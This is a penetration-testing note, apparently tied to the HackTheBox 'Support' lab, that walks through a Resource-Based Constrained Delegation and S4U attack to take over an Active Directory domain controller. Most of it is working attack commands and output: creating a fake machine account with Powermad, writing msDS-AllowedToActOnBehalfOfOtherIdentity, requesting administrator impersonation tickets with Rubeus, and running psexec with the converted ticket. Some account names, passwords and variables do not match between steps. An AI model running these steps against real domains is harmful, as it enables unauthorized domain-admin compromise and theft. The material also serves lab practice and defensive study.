---
description: Taking over a computer object and performing a S4U attack
---

# Resource Based Constrained Delegation

Resource Based Constrained Delegation can be exploited by adding a fake computer $FAKE-COMP01 to the domain, configuring it to act on behalf of the DC. This lets us request Kerberos tickets as $FAKE-COMP01 impersonating a domain admin. We then use Pass-the-Ticket to authenticate as admin and take over the domain by performing a S4U attack.

{% embed url="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview" %}

### <mark style="color:yellow;">How does it work.</mark>

Resource-Based Constrained Delegation (RBCD) is a mechanism in Active Directory that allows a specific object to impersonate any user instead of a user impersonating a user. RBCD can granting computer objects impersonation rights. This is done by using `msDS-AllowedToActOnBehalfOfOtherIdentity`.  Any user withpermissions (like `GenericAll` or `WriteDacl`) on a computer account can configure it.

### <mark style="color:yellow;">What is needed</mark>

<details>

<summary>Video of this attack</summary>

[https://www.youtube.com/watch?time\_continue=268\&v=RUbADHcBLKg\&embeds\_referring\_euri=https%3A%2F%2F0xdf.gitlab.io%2F\&source\_ve\_path=MzY4NDIsMjg2NjY](https://www.youtube.com/watch?time_continue=268\&v=RUbADHcBLKg\&embeds_referring_euri=https%3A%2F%2F0xdf.gitlab.io%2F\&source_ve_path=MzY4NDIsMjg2NjY)

</details>

{% stepper %}
{% step %}
#### Code execution&#x20;

Code execution as a domain user belonging to Authenticated Users

```powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DSMachineAccountQuota
```
{% endstep %}

{% step %}
#### ms-ds-machineaccountquota

The ms-ds-machineaccountquota attribute needs to be higher than 0. This attribute controls the amount of computers that authenticated domain users can add to the domain.

```powershell
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC
```
{% endstep %}

{% step %}
#### Need GenericAll or WriteDACL

Our current user or a group that our user is a member of, needs to have WRITE privileges ( GenericAll , WriteDACL ) over a domain joined computer
{% endstep %}
{% endstepper %}

## Performing the S4U attack

{% hint style="info" %}
S4U (Service for User) is a Kerberos protocol extension that allows a service to impersonate a user to access other resources. A successful S4U attack involves exploiting vulnerabilities in this mechanism to gain unauthorized access to sensitive resources.
{% endhint %}

### <mark style="color:yellow;">Method1</mark>

Create a new computer account to abuse write privilege on the DC. We then set `msDS-AllowedToActOnBehalfOfOtherIdentity` to our account so we can impersonate as any user from to the DC. For this you need to import [Powermad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1).&#x20;

```powershell
New-MachineAccount -MachineAccount Zen -Password $(ConvertTo-SecureString 'pass@123' -AsPlainText -Force)
```

We can then set `msDS-AllowedToActOnBehalfOfOtherIdentity` on our account

```powershell
Set-ADComputer dc -PrincipalsAllowedToDelegateToAccount Zen$
```

And retrieve tickets with Rubeus

<pre class="language-powershell"><code class="lang-powershell"><strong>.\Rubeus.exe s4u /user:Zen$ /password:pass@123/domain:support.htb /impersonateuser:administrator /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /msdsspn:host/dc.support.htb /nowrap
</strong></code></pre>

<details>

<summary>Retrieved tickets</summary>

```powershell
PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: B1809AB221A7E1F4545BD9E24E49D5F4
[*] Building AS-REQ (w/ preauth) for: 'support.htb\0xdfFakeComputer$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFvjCCBbqgAwIBBaEDAgEWooIEzTCCBMlhggTFMIIEwaADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBIcwggSDoAMCARKhAwIBAqKCBHUEggRxfQi/f3np
      EMZE+Bk4cMAc7F/DucdA/LIBYSg4fU7tKg3CuPHLEtVN2di3g0YrCUbB9b8lvTeg1vSU/wjmAbcqP6PK
      geFl4t1fwOZP16vxD6GbJ6xfGizXcN56zL5RN26HWREkQWM2nHmo119CZIeQnGGgnzFF6T4D58M1/7im
      eS2l4leCnzjffmoYSTl8vcQqAn7LANGrNBHxZv4vZEslmSpvXd0swUW96DaCHkAuy04Yxg7ADN4d0I4h
      NRE1/i6U+WGKmfEB5UnPJ57AGkcaMfpT7CJj4fb07ED3FdC9jns0p5dWDqZWVtyWzwPPmZDzaD66HtX7
      mHTq+1TURbs0TUKyKLTE35n2pC3CWQtxgYk7RDZ2WbCuEvJ1FQxYANdVt9z+mshafwwNqgtNy45IZdrb
      RBQBgnWCrjIY0nWVIIU6Tg4xEnhoPm+dVmaG/jLb213VbR2B9xv/QyHYoStpLOezsZRpHPb9gcjSYUha
      KTUbjI3WFsNrJkEx9pXDvlLB8guDfkUj1//AbwQDHft3guaECmnOHdV0vxcIkSqRel/R8BLhuXheioD1
      TC7ESRPRAe3KruckjaWq9hlhBB3aiAcx//gmfS7QCIfQ5OFryZHFdzzzWqCJfPrlqDg5xtYwG0qQ6dSS
      Ou1uJ0F0/b9rY23TIchhwmQFVTaKjeGL6FfbZRcfBgcXFjMtEtzMmYLyAUgdmsgL9Rjh2gosiQvYmxXF
      VUQC2t60oPJsmqUUL1wG6xE6JXf9XG6FmgHVRLMM8E+CxPQ7hTIS0PcPZIlT9f1fvtO9G/8rIJjoUKDB
      GG7wuLRXxxcuRmoWTTiiGDSWgBtOzmOfeK4RSFcZoX9CHKw/+M9bXLKbsLCTXpt8qHZb9u6Kb1jFd4bD
      40ZaF3ep+W9wMSW+MEQw8k9m4u4apBlGQyJDNSBfExXi24K2ro7amzVjMWJZjPLJgZJMKwlOgFzHplC5
      FSo4wbl288W34DZbGW85XZce9dsMSQGYFyYN33nmZxzRvkjxRU7cJ/hacC3EwGNDKbpqRMLhPSs86zgl
      gPk2ZwRZAgcc/q4baeVwJiSIZbh5Ru0p64gpvNZUG71umSlcROh2cJIipBWjilAzeoyTrrXdokx2sG3y
      6FWVnCbBMxICAvCNH1WrqLat4eLV7NGIF07ZLu5mg8bc8xX/q2PTBpyS2QUpx9+rPhDqB9WnOSP/jedo
      DUL0RsywRl6obAqerHdCSWvwt060xSwhYGATpa772oncMtSwOry2eknztoYJ6/N/ANFRZe7M+EW7k96N
      3DLuXJzcnPjLN+xdVKVTjGONa7v5f+7UJW2XqR3J12ue7cI2+cX/O328oWRuImzfaE1WA6yy4ao4zjm7
      8WIn3HjNwu736R2a7iqUrrag+mxFIGIc8lpk5M7Hs01GgbmroY5k+IbuhgZpTUgZSFazAEgqoQxzhk7N
      nnP13tA0Bx+tK0I8TtnMKy7cVSixj57rhaWHD0rgvZgPx6KNGljAJezy6dhxuxmhOJ8eo4HcMIHZoAMC
      AQCigdEEgc59gcswgciggcUwgcIwgb+gGzAZoAMCARehEgQQOoRFqAF1kc0B3FkPPCRj26ENGwtTVVBQ
      T1JULkhUQqIeMBygAwIBAaEVMBMbETB4ZGZGYWtlQ29tcHV0ZXIkowcDBQBA4QAApREYDzIwMjQxMTEx
      MjE0NDAzWqYRGA8yMDI0MTExMjA3NDQwM1qnERgPMjAyNDExMTgyMTQ0MDNaqA0bC1NVUFBPUlQuSFRC
      qSAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0Yg==


[*] Action: S4U

[*] Building S4U2self request for: '0xdfFakeComputer$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to '0xdfFakeComputer$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      AgEBoRUwExsRMHhkZkZha2VDb21wdXRlciQ=

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
[+] Ticket successfully imported!

```

</details>

Find the administrator ticket and echo it into `base64 -d` and save it as ticket.b64. Then use ticketconverter to a format impacket can use.                                                                                                                                                                                                   &#x20;

```bash
$ python ticketConverter.py ticket.kirbi ticket.ccache                                               
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

Finally we can login as administrator. Make sure the dc.domain.yzt is added to hosts.&#x20;

```bash
KRB5CCNAME=ticket.ccache python psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

### <mark style="color:yellow;">Method 2</mark>

First create the fake computer and add it to the domain with [Powermad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1).

```powershell
PS C:\Users\support\Documents> New-MachineAccount -MachineAccount ZenFakeComputer -Password $(ConvertTo-SecureString 'pass@132' -AsPlainText -Force)
[+] Machine account ZenFakeComputer added

# Check it the new machine was added
PS C:\Users\support\Documents> Get-ADComputer -identity ZenFakeComputer
DistinguishedName : CN=ZenFakeComputer,CN=Computers,DC=support,DC=htb
DNSHostName       : ZenFakeComputer.support.htb
Enabled           : True
Name              : ZenFakeComputer
ObjectClass       : computer
ObjectGUID        : 2aa665e0-20e0-420d-ac5c-b59c7b8b3de9
SamAccountName    : ZenFakeComputer$
SID               : S-1-5-21-1677581083-3380853377-188903654-5602
UserPrincipalName :
```

Configure the DC to trust my fake computer by creating an ACL with its SID and assigning it to the DC.

```powershell
# Get the objectSID of the target computer (ZenFakeComputer)
$fakesid = Get-DomainComputer ZenFakeComputer | select -expand objectsid

# Create a new security descriptor that grants full control to the target computer
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"

# Convert the security descriptor to a byte array
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Set the msds-allowedtoactonbehalfofotheridentity attribute on the target computer
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Check if it worked

```powershell
# Get the raw security descriptor of the domain controller
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity

# Create a new security descriptor object from the raw bytes
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0

# Access the discretionary access control list (DACL) of the security descriptor
$Descriptor.DiscretionaryAcl

BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5602
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

It shows an Access Control List that specifies the machines that can act on behalf of the DC with `SecurityIdentifier` of my fake computer with `AccesAllowed`.

First get the rc4\_hmac value.

```powershell
PS C:\Users\support\Documents> .\Rubeus.exe hash /password:zenpass@123 /user:ZenFakeComp /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : zenpass@123
[*] Input username             : ZenFakeComp
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBZenFakeComp
[*]       rc4_hmac             : DFA8C3D737ACDD5F9AF9F4B60205E8D9
[*]       aes128_cts_hmac_sha1 : DBC10236F5F70D66F4BBF93819D3635B
[*]       aes256_cts_hmac_sha1 : 6AFC3C4155B027E5B43BE2B3B1636114C877C3B077808F25B3689A1925931D40
[*]       des_cbc_md5          : 8F20A2C8B90780C7
```

Next retrieve the tickets with Rubeus

```powershell
PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:ZenFakeComp$ /rc4:DFA8C3D737ACDD5F9AF9F4B60205E8D9 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```

